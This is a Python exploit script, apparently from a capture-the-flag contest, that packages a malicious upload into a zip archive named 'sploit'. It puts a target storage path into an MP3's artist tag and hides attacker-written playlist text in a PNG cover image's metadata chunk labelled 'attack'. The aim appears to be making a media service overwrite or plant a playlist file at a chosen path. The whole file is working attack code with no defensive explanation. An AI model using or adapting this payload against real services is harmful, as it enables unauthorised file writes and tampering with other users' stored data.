import os.path
import shutil
import eyed3
import eyed3.plugins
from PIL import Image
from PIL.PngImagePlugin import PngInfo


def create_track_fix(track_name, image_path, tags):
    shutil.copy("proto_track.mp3", track_name)
    mp3file = eyed3.load(track_name)

    if mp3file.tag is None:
        mp3file.initTag()

    with open(image_path, 'rb') as img:
        img_bytes = img.read()

    mp3file.tag.album = ""
    mp3file.tag.artist = tags["artist"]
    mp3file.tag.images.set(3, img_bytes, 'image/png')
    mp3file.tag.save()


def patch_image():
    with open("proto_image.png", mode="rb") as i:
        img = Image.open(i)

        info = PngInfo()

        with open("attacking_playlist.m3u") as pl:
            text = pl.read()

        info.add_text("attack", text)
        img.save("vuln_image.png", "PNG", pnginfo=info)


def create_playlist_file(path_for_playlist):
    tag = {
            "album": f"",
            "artist": f"{path_for_playlist}",
        }

    playlist_dir = "sploit"
    patch_image()

    os.mkdir(str(playlist_dir))

    create_track_fix(f"{playlist_dir}/track1.mp3", "vuln_image.png", tag)
    shutil.copy("proto_playlist.m3u", f"{playlist_dir}/playlist.m3u")
    shutil.make_archive(f"{playlist_dir}", "zip", str(playlist_dir))
    shutil.rmtree(str(playlist_dir))


create_playlist_file(
    "/storage/playlists/00000000-4444-5555-6666-000000000000.m3u",
)

